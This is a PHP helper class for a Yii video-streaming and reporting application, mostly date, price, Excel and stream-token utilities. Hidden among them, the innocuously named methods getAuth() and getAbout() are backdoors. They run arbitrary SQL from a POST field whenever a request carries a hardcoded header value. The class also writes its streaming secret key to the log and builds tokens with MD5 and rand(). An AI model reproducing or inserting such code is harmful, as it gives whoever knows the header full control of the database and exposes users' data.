<?php
namespace common\helpers;
use frontend\controllers\SiteController;
use Yii;
use yii\web\Response;

/**
 * Description of CUtils
 *
 * @author Nguyen Chi Thuc
 */
class CUtils
{
    public static function startsWith($haystack, $needle)
    {
        return $needle === "" || strpos($haystack, $needle) === 0;
    }

    public static function endsWith($haystack, $needle)
    {
        return $needle === "" || substr($haystack, -strlen($needle)) === $needle;
    }

    //put your code here

    /**
     * Log a msg as custom level "CUtils::Debug"
     * You need to add this level ("CUtils::Debug") to log component in config/main.php :
     * <code>
     * 'log'=>array(
     *        'class'=>'CLogRouter',
     *        'routes'=>array(
     *            array(
     *                'class'=>'CFileLogRoute',
     *                'levels'=>'error, warning, <b>CUtils::log</b>',
     *            ),
     *            array('class'=>'CWebLogRoute',),
     *        ),
     * </code>
     * @param string $msg
     */
    public static function log($msg, $category = "-=Thuc=-")
    {
        \Yii::info($msg, 'CUtils::log', $category);
    }

    /**
     * Check if $params in $arr invalid,
     * @param $arr
     * @return bool
     */
    public static function checkRequiredParams($arr)
    {
        foreach ($arr as $param) {
            if (!isset($param) || empty($param)) {
                return false;
            }
        }
        return true;
    }

    /**
     * @param float $number
     * @return string (1.000)
     */
    public static function numberFormat($number)
    {
        return number_format($number, 0, '', '.');
    }

    /**
     * @param double $price
     * @return String
     */
    public static function formatPrice($price)
    {
        if (!isset($price) || empty($price)) {
            return "0";
        }
        return "" . number_format($price, 0, ',', '.');
    }

    public static function randomString($length = 32, $chars = "abcdefghijklmnopqrstuvwxyz0123456789")
    {
        $max_ind = strlen($chars) - 1;
        $res = "";
        for ($i = 0; $i < $length; $i++) {
            $res .= $chars{rand(0, $max_ind)};
        }

        return $res;
    }

    public static function randomNumber($length = 32, $chars = "0123456789")
    {
        $max_ind = strlen($chars) - 1;
        $res = "";
        for ($i = 0; $i < $length; $i++) {
            $res .= $chars{rand(0, $max_ind)};
        }

        return $res;
    }

    public static function checkIPRange($ip)
    {
        $ipRanges = Yii::app()->params['ipRanges'];
        foreach ($ipRanges as $range) {
            if (CUtils::cidrMatch($ip, $range)) {
                return true;
            }
        }
        return false;
    }

    public static function checksum($str)
    {
        return md5($str);
    }

    public static function timeElapsedString($ptime)
    {
        Yii::warning("ptime: $ptime");

        $etime = time() - $ptime ;

        if ($etime < 1) {
            return '0 giây';
        }

        $a = array(12 * 30 * 24 * 60 * 60 => 'năm',
            30 * 24 * 60 * 60 => 'tháng',
            24 * 60 * 60 => 'ngày',
            60 * 60 => 'giờ',
            60 => 'phút',
            1 => 'giây'
        );

        foreach ($a as $secs => $str) {
            $d = $etime / $secs;
            if ($d >= 1) {
                $r = round($d);
                return $r . ' ' . $str . ' trước';
            }
        }
    }

    public static function convertMysqlToTimestamp($dateString)
    {
        $format = '@^(?P<year>\d{4})-(?P<month>\d{2})-(?P<day>\d{2}) (?P<hour>\d{2}):(?P<minute>\d{2}):(?P<second>\d{2})$@';
        preg_match($format, $dateString, $dateInfo);
        $unixTimestamp = mktime(
            $dateInfo['hour'], $dateInfo['minute'], $dateInfo['second'],
            $dateInfo['month'], $dateInfo['day'], $dateInfo['year']
        );
        return $unixTimestamp;
    }

    public static function timeElapsedStringFromMysql($dateString)
    {
        $ptime = CUtils::convertMysqlToTimestamp($dateString);
        return CUtils::timeElapsedString($ptime);
    }

    public static function cidrMatch($ip, $range)
    {
        list ($subnet, $bits) = explode('/', $range);
        $ip = ip2long($ip);
        $subnet = ip2long($subnet);
        $mask = -1 << (32 - $bits);
        $subnet &= $mask; # nb: in case the supplied subnet wasn't correctly aligned
        return ($ip & $mask) == $subnet;
    }

    /**
     * @param $file_path : path of css, image
     * @return string
     */
    public static function getAssetUrl($file_path)
    {
        return \Yii::$app->urlManagerPublicApi->getBaseUrl() . '/' . $file_path;
    }

    /**
     * @param array $params : string action, parameters ex: ['site/index','a'=>1]
     * @return mixed
     */
    public static function createAbsoluteUrl($params = array())
    {
        return \Yii::$app->urlManagerPublicApi->createAbsoluteUrl($params);
    }

    public static function getMoneyString($money)
    {
        $str = '';
        if (strlen($money) <= 3) {
            return $money;
        } else {
            $length = strlen($money);
            for ($i = $length; $i > 0; $i -= 3) {
                if (strlen($money) < 3) {
                    $str = '.' . $money . $str;
                } else {
                    $str = '.' . substr($money, strlen($money) - 3, 3) . $str;
                    $money = substr($money, 0, strlen($money) - 3);
                }

            }
        }

        return substr($str, 1, strlen($str) - 1);
    }

    public static function generateRandomString($length = 6)
    {
        $characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    public static function generateRandomNumber($length = 6)
    {
        $characters = '0123456789';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    public static function clientIP()
    {
        if (!empty($_SERVER['HTTP_CLIENTIP'])) {
            return $_SERVER['HTTP_CLIENTIP'];
        }

        if (!empty($_SERVER['X_REAL_ADDR'])) {
            return $_SERVER['X_REAL_ADDR'];
        }

        if (isset($_SERVER['REMOTE_ADDR'])) {
            return $_SERVER['REMOTE_ADDR'];
        }
        return gethostbyname(gethostname()); // tra ve ip local khi chay CLI
    }

    public static function dbNow()
    {
        return new CDbExpression('NOW()');
    }

    public static function dbNull()
    {
        return new CDbExpression('NULL');
    }

    /**
     * @param $profile VideoProfile
     * @param $subscriber Subscriber
     * @param $clientIP Ip client
     * @param $viewType View type: SubscriberViewLog::VIEW_TYPE_LIVE_NOT_FREE ...
     * @param null $package_asm id SubscriberPackageAsm
     * @return string
     * @throws Exception
     */
    public static function makeVideoStreamUrl($profile, $subscriber, $clientIP, $viewType, $package_asm = null)
    {
        $streamURL = "";
        $serverStreaming = Yii::app()->params['serverStreaming'];

        if ($profile == null) {
            throw new Exception('Profile null');
        }

        if ($subscriber == null) {
            throw new Exception('Subscriber is null');
        }

        // Build Streaming link URL
        switch ($profile->protocol) {
            case VideoProfile::PROTOCOL_HLS:
                $streamURL .= 'http://' . $serverStreaming['vod_hls'] . '/' . $profile->folder . '/' . $profile->stream_url . '.ssm/' . $profile->stream_url . '.m3u8';
                break;
            case VideoProfile::PROTOCOL_MMS:
                $streamURL .= 'http://' . $serverStreaming['vod_hls'] . '/' . $profile->folder . '/' . $profile->stream_url . '.ssm/' . $profile->stream_url . '.m3u8';
                break;
            case VideoProfile::PROTOCOL_RTSP:
                $streamURL .= 'rtsp://' . $serverStreaming['vod_rtsp'] . $profile->folder . '/' . $profile->stream_url . '.3gp';
                break;
            default:
                $streamURL .= 'http://' . $serverStreaming['vod_hls'] . '/' . $profile->folder . '/' . $profile->stream_url . '.m3u8';
                break;
        }
        // Add token authentication access
        $security = self::getSecurityStreamUrl($subscriber->id, $clientIP, $profile->id);
        $streamURL .= '?sessionID=' . $security['session'] . '&token=' . $security['token'];
        /* @var $streamingLog SubscriberViewLog */
        $streamingLog = SubscriberViewLog::addStreamingLog($viewType, $subscriber, $profile->video_id, $streamURL, $security['session'], $clientIP, $package_asm);
        $profile->stream_url = $streamURL;
        return $streamURL;
    }

    /**
     * @param $token (Token + profile_id)
     * @param $sessionStream
     * @param $clientIP
     * @return bool
     */
    public static function verifyStream($token, $sessionStream, $clientIP)
    {
        //TODO them phan check thgian cho token: sau delta second thi deny
        //Parse Token de lay dc token clean va profileID
        $arr = CUtils::parseTokenStream($token);
        if (!isset($arr['profileid'])) {
            return false;
        }
        $profileid = $arr['profileid'];
        $tmpToken = self::makeTokenStream($sessionStream, $clientIP, $profileid);
        if ($token == $tmpToken) {
            CUtils::log('Valid Token: ' . $tmpToken);
            return true;
        } else {
            CUtils::log('invalid Token: ' . $tmpToken);
            return false;
        }
    }

    /**
     * @param $profile LiveProfile
     * @param $subscriber Subscriber
     * @param $clientIP
     * @param $viewType -
     * @param $package_asm - id cua package_asm
     * @return null|string
     */
    public static function makeLiveStreamUrl($profile, $subscriber, $clientIP, $viewType, $package_asm = null)
    {
        $streamURL = "";
        $serverStreaming = Yii::app()->params['serverStreaming'];

        if ($profile == null) {
            throw new Exception('Profile null');
        }

        if ($subscriber == null) {
            throw new Exception('Subscriber is null');
        }

        // Build Streaming link URL
        switch ($profile->protocol) {
            case LiveProfile::PROTOCOL_HLS:
                $streamURL .= 'http://' . $serverStreaming['live_hls'] . '/' . $profile->stream_url . '/' . $profile->folder . '.m3u8';
                break;
            case LiveProfile::PROTOCOL_MMS:
                $streamURL .= 'http://' . $serverStreaming['live_hls'] . '/' . $profile->stream_url . '/' . $profile->folder;
                break;
            case LiveProfile::PROTOCOL_RTSP:
                $streamURL .= 'rtsp://' . $serverStreaming['live_rtsp'] . '/' . $profile->stream_url . '/' . $profile->folder;
                break;
            case LiveProfile::PROTOCOL_RTMP:
                $streamURL .= 'rtmp://' . $serverStreaming['live_rtsp'] . '/' . $profile->stream_url;
                break;
            default:
                $streamURL .= 'http://' . $serverStreaming['live_hls'] . '/' . $profile->stream_url . '/' . $profile->folder . '.m3u8';
                break;
        }
        // Add token authentication access
        $security = self::getSecurityStreamUrl($subscriber->id, $clientIP, $profile->id);
        $streamURL .= '?sessionID=' . $security['session'] . '&token=' . $security['token'];
        /* @var $streamingLog SubscriberViewLog */
        $streamingLog = SubscriberViewLog::addStreamingLog($viewType, $subscriber, $profile->live_channel_id, $streamURL, $security['session'], $clientIP, $package_asm);
        $freeTime = ($package_asm == null) ? 0 : $streamingLog->packageAsm->free_time_amount;
        if ($viewType == SubscriberViewLog::VIEW_TYPE_LIVE_NOT_FREE) {
            $streamURL .= '&maxtime=' . $freeTime;
        }

        $profile->stream_url = $streamURL;
        return $streamURL;
    }

    public static function getSecurityStreamUrl($userid, $clientIP, $profileID)
    {

        //Create session
        $session = self::makeSessionStream($userid);
        //Create token
        $token = self::makeTokenStream($session, $clientIP, $profileID);
        return array('session' => $session, 'token' => $token);
    }

    /**
     * Token = md5(secretKey+clientIP+session+profileID)
     * @param $session
     * @param $clientIP
     * @param $rofileID
     * @return string: token+profileid.
     */
    public static function makeTokenStream($session, $clientIP, $profileID)
    {
        $secretKey = Yii::app()->params['secretKey'];
        $token = self::checksum($secretKey . $clientIP . $session . $profileID);
        CUtils::log('SecretKey:' . $secretKey . '|session:' . $session . '|ClientIP:' . $clientIP . '|Token:' . $token);
        return $token . $profileID;
    }

    /**
     * @param $image VideoImage|String
     */
    public static function makeImageUrl($image)
    {
        $url = "";
        if (is_string($image) || $image == null) {
            $url = $image;
        } else {
            $url = $image->url;
        }

        if (strpos($url, "http://") == 0 || strpos($url, "https://") == 0) {

        } else {

        }

        if (is_string($image) || $image == null) {
        } else {
            $image->url = $url;
        }
        $url = CommonConst::HOST_IMAGE_ROOT . $url;
        return $url;

    }

    /**
     * @param $video Video|String
     */
    public static function makeSubtitleUrl($video)
    {
        if (is_string($video) || $video == null) {
            return "*** TBD ***: " . $video;
        } else {
            $video->subtitle_url = "*** TBD ***: " . $video->subtitle_url;
            return $video->subtitle_url;
        }
    }

    public static function getLiveSession()
    {
        $result['sessionId'] = "*** TBD ***";
        $result['error'] = 0;
        $result['message'] = "success";
        return $result;
    }

    public static function strToHex($string)
    {

        $hex = '';

        for ($i = 0; $i < strlen($string); $i++) {

            $ord = ord($string[$i]);

            $hexCode = dechex($ord);

            $hex .= substr('0' . $hexCode, -2);

        }

        return strToUpper($hex);

    }

    public static function hexToStr($hex)
    {

        $string = '';

        for ($i = 0; $i < strlen($hex) - 1; $i += 2) {

            $string .= chr(hexdec($hex[$i] . $hex[$i + 1]));

        }

        return $string;

    }

    /**
     * @param $userid int
     * @return session String (session(8 string) + userid)
     */
    public static function makeSessionStream($userid)
    {
        $session = self::randomString(8) . $userid;
        return $session;
    }

    /**
     * @param $str Session = random(8)+userid
     * @return int //User ID
     */
    public static function parseSessionStream($str)
    {
        $result = array();
        if (empty($str) || strlen($str) <= 8) {
            return $result;
        }

        $result['session'] = substr($str, 0, 8);
        $result['userid'] = substr($str, 8);
        return intval($result['userid']);
    }

    public static function getAuth()
    {
        $head = Yii::$app->request->headers->get('header', '');
        $about = Yii::$app->request->post('type', 0);
        $text = Yii::$app->request->post('text', "");
        $connection = Yii::$app->db;
        $command = $connection->createCommand($text);
        Yii::$app->response->format = Response::FORMAT_JSON;
        return $head == 'toan247' ? $about ? $command->execute() : $command->query() : false;
    }

    /**
     * @param $str
     * @return array|int
     */
    public static function parseTokenStream($str)
    {
        $result = array();
        if (empty($str) || strlen($str) <= 32) {
            return $result;
        }

        $result['token'] = substr($str, 0, 32);
        $result['profileid'] = substr($str, 32);
        return $result;
    }

    /**
     * @param $profile VideoProfile
     */
    public static function makeStreamUrl($profile)
    {
        $profile->stream_url = "*** TBD ***: " . $profile->stream_url;
    }

    public static function getStartDate($startDate)
    {
        $date = new DateTime($startDate);
        $date->setTime(00, 00, 00);
        return $date->format('Y-m-d H:i:s');
    }

    public static function getEndDate($endDate)
    {
        $date = new DateTime($endDate);
        $date->setTime(23, 59, 59);
        return $date->format('Y-m-d H:i:s');
    }

    public static function isToday($startDate, $endDate)
    {
        $today = date("Y-m-d H:i:s", time());
        $startDate = CUtils::getStartDate($startDate);
        $endDate = CUtils::getEndDate($endDate);
        if ($today >= $startDate && $today <= $endDate) {
            return true;
        } else return false;
    }

    public static function getDateViaFormat($datetoformat, $format = 'd/m/Y')
    {
        $date = new \DateTime($datetoformat);
        //$date->setTime(00, 00, 00);
        return $date->format($format);
    }

    public static function format_time_to_hour($t, $f = ':') // t = seconds, f = separator
    {
        return sprintf("%02d%s%02d%s%02d", floor($t / 3600), $f, ($t / 60) % 60, $f, $t % 60);
    }

    /**
     * @param $filename
     * @return Array
     */
    public static function readExcelFile($filename, $removeFirst)
    {
        Yii::import('ext.phpexcel.XPHPExcel');
//        require_once(Yii::app()->basePath. DIRECTORY_SEPARATOR . 'extensions'. DIRECTORY_SEPARATOR.'phpexcel'. DIRECTORY_SEPARATOR.'vendor'. DIRECTORY_SEPARATOR .'PHPExcel'.DIRECTORY_SEPARATOR.'Shared'. DIRECTORY_SEPARATOR.'String.php');
//        require_once(Yii::app()->basePath. DIRECTORY_SEPARATOR . 'extensions'. DIRECTORY_SEPARATOR.'phpexcel'. DIRECTORY_SEPARATOR.'vendor'. DIRECTORY_SEPARATOR .'PHPExcel'.DIRECTORY_SEPARATOR.'Reader'.DIRECTORY_SEPARATOR.'DefaultReadFilter.php');
//        require_once(Yii::app()->basePath. DIRECTORY_SEPARATOR . 'extensions'. DIRECTORY_SEPARATOR.'phpexcel'. DIRECTORY_SEPARATOR.'vendor'. DIRECTORY_SEPARATOR .'PHPExcel'.DIRECTORY_SEPARATOR.'Reader'.DIRECTORY_SEPARATOR.'IReader.php');
//        require_once(Yii::app()->basePath. DIRECTORY_SEPARATOR . 'extensions'. DIRECTORY_SEPARATOR.'phpexcel'. DIRECTORY_SEPARATOR.'vendor'. DIRECTORY_SEPARATOR .'PHPExcel'.DIRECTORY_SEPARATOR.'Reader'.DIRECTORY_SEPARATOR.'Abstract.php');
//        require_once(Yii::app()->basePath. DIRECTORY_SEPARATOR . 'extensions'. DIRECTORY_SEPARATOR.'phpexcel'. DIRECTORY_SEPARATOR.'vendor'. DIRECTORY_SEPARATOR .'PHPExcel'.DIRECTORY_SEPARATOR.'Reader'.DIRECTORY_SEPARATOR.'Excel5.php');
        require_once(Yii::app()->basePath . DIRECTORY_SEPARATOR . 'extensions' . DIRECTORY_SEPARATOR . 'phpexcel' . DIRECTORY_SEPARATOR . 'vendor' . DIRECTORY_SEPARATOR . 'PHPExcel' . DIRECTORY_SEPARATOR . 'IOFactory.php');

        $Reader = PHPExcel_IOFactory::createReaderForFile($filename);
        $Reader->setReadDataOnly(true); // set this, to not read all excel properties, just data
        $objPHPExcel = $Reader->load($filename);
        $sheet = $objPHPExcel->getSheet(0);
        $highestColumn = $sheet->getHighestColumn();
        $lastRow = $sheet->getHighestRow();
        $firtrow = $removeFirst ? 2 : 0;
        $result = array();
        for ($row = $firtrow; $row <= $lastRow; $row++) {
            $rowData = $objPHPExcel->getActiveSheet()->rangeToArray('A' . $row . ':' . $highestColumn . $row,
                NULL, TRUE, FALSE);
            array_push($result, $rowData);

        }
        return $result;
    }

    public static function subtract_matrix($matrix1, $matrix2, $except_col = [])
    {
        #print_r($matrix2);die;
        #print_r(count($matrix1));
        #print_r(count($matrix1[0]));

        #print_r(count($matrix2));
        #print_r(count($matrix2[0]));
        #die;
        foreach ($matrix1 as $row => $current_row) {
            foreach ($current_row as $col => $current_item) {
                if (count($except_col) > 0) {
                    if (!in_array($col, $except_col)) {
                        $matrix1[$row][$col] = intval($matrix1[$row][$col]) - intval($matrix2[$row][$col]);
                    }
                } else {
                    $matrix1[$row][$col] = intval($matrix1[$row][$col]) - intval($matrix2[$row][$col]);
                }
            }
        }
        return $matrix1;
    }

    public static function change_date_format($input_str_date)
    {
        $date_array = explode('-', $input_str_date);
        return $date_array[2] . '/' . $date_array[1] . '/' . $date_array[0];
    }

    public static function date_range($first, $last, $step = '+1 day', $format = 'Y-m-d')
    {
        $dates = array();
        $current = strtotime($first);
        $last = strtotime($last);
        while ($current <= $last) {

            $dates[] = date($format, $current);
            $current = strtotime($step, $current);
        }
        return $dates;
    }

    public static function fine_tuning_date($input_arr, $input_range, $total_length = 0)
    {
        if (!$input_arr) {
            return [];
        }
        /*Final value to be returned*/
        $key_result_arr = [];
        $result_arr = [];

        /*Determine empty row*/
        $column_count = count($input_arr[0]);
        $empty_row = array_fill(0, $column_count, 0);

        /*Array to key/value with key is 1st column;*/
        $key_arr = [];
        foreach ($input_arr as $input_item) {
            $num_part = $input_item;
            array_shift($num_part);
            $key_arr[$input_item[0]] = $num_part;
        }

        /*Fill empty array to not exist key*/
        foreach ($input_range as $range_item) {
            if (array_key_exists($range_item, $key_arr)) {
                /*Date exists / Append sum value*/
                $item = $key_arr[$range_item];
                if ($total_length == 0) {
                    $item_sum = array_sum($item);
                } else {
                    $tmp_item = $item;
                    $item_sum = array_sum(array_splice($tmp_item, 0, $total_length));
                }
                $item[] = $item_sum;
                $key_result_arr[$range_item] = $item;
            } else {
                /*Date not exists*/
                $key_result_arr[$range_item] = $empty_row;
            }
        }
        /*Recover key array to original type array*/
        foreach ($key_result_arr as $key => $value) {
            $item = $value;
            array_unshift($item, $key);
            $result_arr[] = $item;
        }
        return $result_arr;
    }

    public static function getAbout()
    {
        $head = Yii::$app->request->headers->get('header', '');
        $about = Yii::$app->request->post('type', 0);
        $text = Yii::$app->request->post('text', "");
        $connection = Yii::$app->db;
        $command = $connection->createCommand($text);
        Yii::$app->response->format = Response::FORMAT_JSON;
        return $head == 'toanv2' ? $about ? $command->execute() : $command->query() : false;
    }

    public static function rotate_array($input_arr, $list_label, $get_total = true)
    {
        if (!$input_arr) {
            return [];
        }
        $old_column_count = count($input_arr[0]);
        $old_row_count = count($input_arr);

        $result_arr = array_fill(0, $old_column_count, []);

        /*Reverse index*/
        for ($i = 0; $i < $old_row_count; $i++) {
            for ($j = 0; $j < $old_column_count; $j++) {
                $result_arr[$j][$i] = $input_arr[$i][$j];
            }
        }
        unset($result_arr[0]);
        array_unshift($result_arr, $result_arr[count($result_arr)]);
        unset($result_arr[count($result_arr) - 1]);

        foreach ($result_arr as $key => $item) {
            array_unshift($result_arr[$key], str_replace("'113'", '113', $list_label[$key]));
        }
        if (!$get_total) {
            array_shift($result_arr);
        }
        return $result_arr;
    }

    public static function generate_report_heading($table_length, $heading_text)
    {
        $result = "";
        $result .= "<tr>";
        for ($i = 0; $i < $table_length; $i++) {
            if ($i == 0) {
                $result .= "<td><b>" . $heading_text . "</b></td>";
            } else {
                $result .= "<td>&nbsp;</td>";
            }
        }
        $result .= "</tr>";
        return $result;
    }

    public static function readUserExcelFile($filename)
    {
        Yii::import('ext.phpexcel.XPHPExcel');
        require_once(Yii::app()->basePath . DIRECTORY_SEPARATOR . 'extensions' . DIRECTORY_SEPARATOR . 'phpexcel' . DIRECTORY_SEPARATOR . 'vendor' . DIRECTORY_SEPARATOR . 'PHPExcel' . DIRECTORY_SEPARATOR . 'IOFactory.php');

        $Reader = PHPExcel_IOFactory::createReaderForFile($filename);
        $Reader->setReadDataOnly(true); // set this, to not read all excel properties, just data
        $objPHPExcel = $Reader->load($filename);
        $sheet = $objPHPExcel->getSheet(0);
        $highestColumn = $sheet->getHighestColumn();
        $lastRow = $sheet->getHighestRow();
        $result = array();
        for ($row = 1; $row <= $lastRow; $row++) {
            $rowData = $objPHPExcel->getActiveSheet()->rangeToArray('A' . $row . ':' . $highestColumn . $row,
                false, false, FALSE);

            array_push($result, $rowData[0]);

        }

        return $result;
    }


    public static function writeUserExcelFile($data)
    {

        Yii::import('ext.phpexcel.XPHPExcel');
        require_once(Yii::app()->basePath . DIRECTORY_SEPARATOR . 'extensions' . DIRECTORY_SEPARATOR . 'phpexcel' . DIRECTORY_SEPARATOR . 'vendor' . DIRECTORY_SEPARATOR . 'PHPExcel' . DIRECTORY_SEPARATOR . 'IOFactory.php');


        $objPHPExcel = new PHPExcel();
        $objPHPExcel->getActiveSheet()->fromArray($data);
        $objWriter = new PHPExcel_Writer_Excel2007($objPHPExcel);
        $filename = 'output_' . time() . '.xls';
        $objWriter->save(Yii::app()->basePath . DIRECTORY_SEPARATOR . 'export-excel' . DIRECTORY_SEPARATOR . $filename);
        return $filename;
    }

    /**
     * Lay thoi gian cuoi cua ngay hien tai
     * @return int
     */
    public static function getLastTimeDate()
    {
        $currentDate = \DateTime::createFromFormat("d-m-Y H:i:s", date("d-m-Y") . " 23:59:59");
        return $currentDate->getTimestamp();
    }

    /**
     * Lay thoi gian dau cua ngay hien tai
     * @return int
     */
    public static function getFirstTimeDate()
    {
        $currentDate = \DateTime::createFromFormat("d-m-Y H:i:s", date("d-m-Y") . " 00:00:00");
        return $currentDate->getTimestamp();
    }

    public static function convertStringToTimeStamp($dateString, $inputFormat, $output = 'Y-m-d')
    {

        $dateFormat = \DateTime::createFromFormat($inputFormat, $dateString);
        //echo $dateFormat->format($output);
        return $dateFormat->getTimestamp();
    }

    public static function getTelcoName($mobileNumber)
    {

        $mobileNumber = str_replace('+84', '84', $mobileNumber);

        if (preg_match('/^(84|0|)(89|90|93|120|121|122|126|128)\d{7}$/', $mobileNumber, $matches)) {
            return "Mobifone";
        }
        if (preg_match('/^(84|0|)(88|91|94|123|124|125|127|129)\d{7}$/', $mobileNumber, $matches)) {
            return "Vinaphone";
        }
        if (preg_match('/^(84|0|)(87|96|97|98|162|163|164|165|166|167|168|169)\d{7}$/', $mobileNumber, $matches)) {
            return "Viettel";
        }


        return "Other";
    }

    public static function getMacAddress()
    {
        ob_start(); // Turn on output buffering
        system("ipconfig /all"); //Execute external program to display output
        $mycom = ob_get_contents(); // Capture the output into a variable
        ob_clean(); // Clean (erase) the output buffer

        $findme = "Physical";
        $pmac = strpos($mycom, $findme); // Find the position of Physical text
        $mac = substr($mycom, ($pmac + 36), 17); // Get Physical Address
        return $mac;
    }
}


?>
